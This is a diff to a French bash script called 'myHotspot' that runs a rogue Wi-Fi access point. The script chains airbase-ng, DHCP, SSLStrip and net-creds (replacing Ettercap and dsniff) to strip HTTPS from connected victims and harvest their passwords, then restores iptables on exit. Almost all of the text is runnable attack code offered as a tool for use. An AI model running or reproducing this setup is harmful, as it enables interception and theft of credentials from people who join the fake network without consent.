@@ -11,9 +11,7 @@ echo "[+] Airbase-ng (fake ap) stoppé"
 pkill dhcpd
 echo "[+] DHCP stoppé"
 killall python
-echo "[+] SSLStrip et SSLStrip Log stoppés"
-pkill ettercap
-echo "[+] Ettercap stoppé"
+echo "[+] Net-Creds, SSLStrip et SSLStrip Log stoppés"
 pkill dsniff
 echo "[+] Dsniff stoppé"
 sleep 2
@@ -40,7 +38,7 @@ echo "[+] Redémarrage du système internet"
 
 echo "[+] Nettoyage et restauration terminé !"
 echo "[+] Merci d'utiliser myHotspot et à bientôt !"
-sleep 6
+sleep 4
 clear
 
 exit
@@ -121,25 +119,19 @@ sleep 3
 
 # Sslstrip
 echo "[+] Configuration et démarrage de SSLStrip"
-xterm -geometry 75x15+1+200 -T SSLStrip -e sslstrip -f -p -k 10000 & sslstripid=$!
-sleep 3
-
-# Ettercap
-echo "[+] Configuration et démarrage de Ettercap"
-xterm -xrm '*hold: true' -geometry 73x25+1+300 -T Ettercap -s -sb -si +sk -sl 5000 -e ettercap -p -u -T -q -w /pentest/wireless/myhotspot/passwords -i at0 & ettercapid=$!
-disown
-sleep 3
+sslstrip -f -p -k 10000 & sslstripid=$!
+sleep 2
 
 #SSLStrip Log
 echo "[+] Configuration et démarrage de SSLStrip Log"
-xterm -geometry 75x15+1+600 -T "SSLStrip Log" -e tail -f sslstrip.log & sslstriplogid=$!
-sleep 3
+tail -f sslstrip.log & sslstriplogid=$!
+sleep 2
 
-#SSLStrip Log
-echo "[+] Configuration et démarrage de Dsniff [beta]"
-xterm -xrm '*hold: true' -geometry 75x15+1+600 -T "Dsniff" -e dsniff -i at0 & dsniffid=$!
+#Net-Creds
+echo "[+] Configuration et démarrage de Net-Creds"
+xterm -xrm '*hold: true' -geometry 125x30+1+600 -T "Net-Creds" -e python /etc/net-creds/net-creds.py -i at0 & netcredsid=$!
 disown
-sleep 3
+sleep 2
 
 clear
 echo "[+] Initialistion terminée"
@@ -159,16 +151,14 @@ kill ${dchpid}
 echo "[+] DHCP stoppé"
 kill ${sslstripid}
 echo "[+] SSLStrip stoppé"
-kill ${ettercapid}
-echo "[+] Ettercap stoppé"
 kill ${sslstriplogid}
 echo "[+] SSLStrip log stoppé"
-kill ${dsniffid}
-echo "[+] Dsniff stoppé"
-sleep 2
+kill ${netcredsid}
+echo "[+] Net-Creds stoppé"
+sleep 1
 
 echo "[+] Airmon-ng stoppé"
-sleep 2
+sleep 1
 echo
 echo "0" > /proc/sys/net/ipv4/ip_forward
 iptables --flush
@@ -176,7 +166,7 @@ iptables --table nat --flush
 iptables --delete-chain
 iptables --table nat --delete-chain
 echo "[+] iptables restaurée"
-sleep 2
+sleep 1
 airmon-ng stop $fakeap_interface
 airmon-ng stop $fakeap
 sleep 1
@@ -187,7 +177,7 @@ echo "[+] Redémarrage du système internet"
 
 echo "[+] Nettoyage et restauration terminé !"
 echo "[+] Merci d'utiliser myHotspot et à bientôt !"
-sleep 6
+sleep 4
 clear
 fi
 exit
